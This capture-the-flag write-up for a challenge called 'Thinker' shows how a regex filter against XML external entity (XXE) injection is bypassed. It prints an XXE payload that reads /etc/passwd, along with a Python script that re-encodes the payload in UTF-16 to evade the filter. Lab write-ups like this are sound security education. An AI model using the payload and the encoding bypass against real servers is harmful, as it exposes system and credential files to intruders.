# Thinker

**source code**:

[Thinker.tar.xz](Thinker%20308d246d18ad48e6adc3aa51d8607938/Thinker.tar.xz)

## Analysation of the app:

There is an about page which reveals us the flag position:

![Untitled](Thinker%20308d246d18ad48e6adc3aa51d8607938/Untitled.png)

The User page shows us some sample user database:

![Untitled](Thinker%20308d246d18ad48e6adc3aa51d8607938/Untitled%201.png)

In upload page,  there we can upload xml files into the server.

**Sample test xml file:**

![Untitled](Thinker%20308d246d18ad48e6adc3aa51d8607938/Untitled%202.png)

**Output:**

![Untitled](Thinker%20308d246d18ad48e6adc3aa51d8607938/Untitled%203.png)

## Analysing the source code:

The upload.php has the following code: 

![Untitled](Thinker%20308d246d18ad48e6adc3aa51d8607938/Untitled%204.png)

][This particular code pops the values in the xml files into the webpage only if the variable $isvalid is true in the if condition.

And this is how the variable is set:

![Untitled](Thinker%20308d246d18ad48e6adc3aa51d8607938/Untitled%205.png)

So basically this code is preventing xxe injections.

While surfing the internet about bypassing the filters on **xxe** injection, I got this:

![Untitled](Thinker%20308d246d18ad48e6adc3aa51d8607938/Untitled%206.png)

With the help of such encodings, it is easy to bypass a WAF using regular expressions since, in this type of WAF, regular expressions are often configured only for a one-character set.

So now we can try xxe injection payload with different encodings other than UTF-8:

```xml
<!DOCTYPE user [ <!ENTITY passwd SYSTEM "file:///etc/passwd">]>
<users>
    <user>
        <name>name</name>
        <email>email</email>
        <group>group</group>
        <intro>&passwd;</intro>
    </user>
</users>
```

I encoded the xml file in UTF-16 using a python script:

```python
input_file = "input.xml"
output_file = "output_utf16.xml"

with open(input_file, 'r', encoding='utf-8') as utf8_file:
    content = utf8_file.read()
with open(output_file, 'w', encoding='utf-16') as utf16_file:
    utf16_file.write(content)
```

This is how the hex of the file look like after encoding:

![Untitled](Thinker%20308d246d18ad48e6adc3aa51d8607938/Untitled%207.png)

The output after uploading the file:

![Untitled](Thinker%20308d246d18ad48e6adc3aa51d8607938/Untitled%208.png)

Yeah we got passwd file of the system, So you know how to get the flag right!!